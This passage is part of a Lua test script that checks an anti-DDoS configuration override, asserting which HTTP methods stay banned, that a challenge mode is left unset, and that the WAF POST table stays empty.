package.loaded["anti_ddos_config_store"] = store
local function banned_methods(site)
	local m = {}
	for _, r in ipairs(site[26]) do
		m[r[1]] = r[3] == 1
	end
	return m
end
local before = banned_methods(store.anti_ddos_table[1])
assert(
	before.OPTIONS and before.PUT,
	"upstream no longer bans OPTIONS and PUT in field 26; revisit the anti_ddos_table override"
)
for _, site in ipairs(g.anti_ddos_table()) do
	local after = banned_methods(site)
	assert(after.OPTIONS == nil, "anti_ddos_table override left OPTIONS in the prohibited methods")
	assert(
		after.PUT and after.PATCH and after.DELETE,
		"anti_ddos_table override must keep the PUT, PATCH, and DELETE bans"
	)
end

assert(
	g.master_switch == nil and g.master_switch_custom_hosts == nil,
	"the override must not set the inactive challenge mode; upstream's automatic mode governs"
)
assert(g.content_type_fix == false, "content_type_fix must be false, or every request reaches the backend twice")
assert(#g.WAF_POST_Request_table == 0, "WAF_POST_Request_table must stay empty")
if failed > 0 then
	os.exit(1)
end
print("PASS")
